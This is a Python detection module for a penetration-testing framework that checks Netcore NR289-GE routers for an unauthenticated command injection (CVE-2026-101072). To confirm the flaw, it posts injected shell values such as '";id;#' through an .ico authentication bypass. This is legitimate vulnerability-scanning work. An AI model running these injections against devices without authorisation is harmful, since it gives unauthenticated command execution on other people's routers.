#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Netcore NR289-GE CVE-2026-101072 ap_ip.cgi command injection."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Netcore NR289-GE CVE-2026-101072 Detect",
        "description": (
            "Detects CVE-2026-101072 in Netcore NR289-GE: unauthenticated OS command "
            "injection via POST /x.ico/ap_ip.cgi (boa .ico auth bypass). The ip "
            "parameter is embedded into a wget shell command without validation. "
            "Uses a short echo probe when active_probe is enabled."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-101072"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-101072",
            "https://github.com/senxitoyshuyi-ui/HACKALL",
        ],
        "modules": ["exploits/linux/http/netcore_nr289_ge_cve_2026_101072_rce"],
        "tags": [
            "web",
            "scanner",
            "netcore",
            "router",
            "cmdi",
            "unauth",
            "cve-2026-101072",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.4,
            "value": 1.0,
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": "ap_ip.cgi ip parameter"},
                ],
                "suggested_followups": [
                    "exploits/linux/http/netcore_nr289_ge_cve_2026_101072_rce",
                    "scanner/http/netcore_nr289_ge_cve_2026_101077_detect",
                ],
            },
        },
    }

    ap_mac = OptString(
        "AA:BB:CC:DD:EE:FF",
        "Bound AP MAC prefix (first 6 bytes must match bind_list_table)",
        False,
    )
    active_probe = OptBool(
        True,
        "Confirm with short echo/id injection via ap_ip.cgi",
        False,
    )

    def _inject(self, payload: str):
        path = "/x.ico/ap_ip.cgi"
        data = {
            "mac": str(self.ap_mac or "AA:BB:CC:DD:EE:FF"),
            "ip": payload,
            "mask": "1",
            "gateway": "1",
        }
        return self.http_request(
            method="POST",
            path=path,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )

    def run(self):
        marker = f"k{secrets.token_hex(3)}"
        if bool(self.active_probe):
            response = self._inject(f'";echo {marker};#')
            body = (response.text or "") if response else ""
            if marker in body or re.search(r"uid=\d+", body):
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-101072",
                    reason="Netcore ap_ip.cgi command injection confirmed",
                    path="/x.ico/ap_ip.cgi",
                )
                return True

        response = self._inject('";id;#')
        if not response:
            return False
        body = response.text or ""
        if re.search(r"uid=\d+.*gid=\d+", body):
            self.set_info(
                severity="critical",
                cve="CVE-2026-101072",
                reason="Netcore ap_ip.cgi reflects command output (id)",
                path="/x.ico/ap_ip.cgi",
            )
            return True

        bypass = self.http_request(
            method="POST",
            path="/x.ico/ap_list_show.cgi",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data="noneed=noneed",
            allow_redirects=False,
        )
        if bypass and int(bypass.status_code or 0) == 200:
            self.set_info(
                severity="high",
                cve="CVE-2026-101072",
                reason=(
                    "Netcore .ico auth bypass present; ap_ip.cgi injection surface "
                    "reachable (command output not observed — may require bound AP MAC)"
                ),
                path="/x.ico/ap_ip.cgi",
            )
            return True
        return False
